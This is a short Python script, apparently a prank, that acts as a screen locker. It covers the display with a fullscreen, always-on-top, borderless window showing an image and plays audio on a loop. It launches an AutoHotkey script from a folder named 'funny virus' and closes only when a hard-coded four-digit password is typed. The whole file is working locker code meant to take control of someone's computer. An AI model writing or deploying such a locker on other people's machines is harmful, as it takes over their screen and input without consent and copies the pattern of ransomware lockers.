# Mouad Garroud
import tkinter as tk
from PIL import Image, ImageTk
import pygame ,os,subprocess


correct_password = "1234"

root = tk.Tk()
pygame.mixer.init()

path = "audio.mp3"

pygame.mixer.music.load(path)
pygame.mixer.music.play(loops=-1)
root.attributes("-fullscreen", True)
root.attributes("-topmost", True)
root.overrideredirect(True)

image_path = "Pic.png"

screen_width = root.winfo_screenwidth()
screen_height = root.winfo_screenheight()
background_image = Image.open(image_path)
background_image = background_image.resize((screen_width, screen_height), Image.LANCZOS)
background_photo = ImageTk.PhotoImage(background_image)
background_label = tk.Label(root, image=background_photo)
background_label.place(x=0, y=0, relwidth=1, relheight=1)

def check_password(event):
    if password_entry.get() == correct_password:
        root.destroy()
entry_frame = tk.Frame(root, bg="#F0F0F0", bd=0, highlightthickness=0)
entry_frame.place(relx=0.5, rely=0.1, anchor="n", width=35, height=20)
password_entry = tk.Entry(entry_frame, show="*", font=("Helvetica", 12), justify="center",
                          bg="#F0F0F0", fg="black", bd=0, highlightthickness=0, insertbackground="black")
password_entry.pack(fill="both", expand=True, padx=5, pady=5)
password_entry.bind("<KeyRelease>", lambda event: check_password(event) if len(password_entry.get()) == 4 else None)
subprocess.run(
        [r"C:/Program Files/AutoHotkey/UX/AutoHotkeyUX.exe", r"C:/funny virus/hotkey.ahk"],
        check=True
    )
root.mainloop()
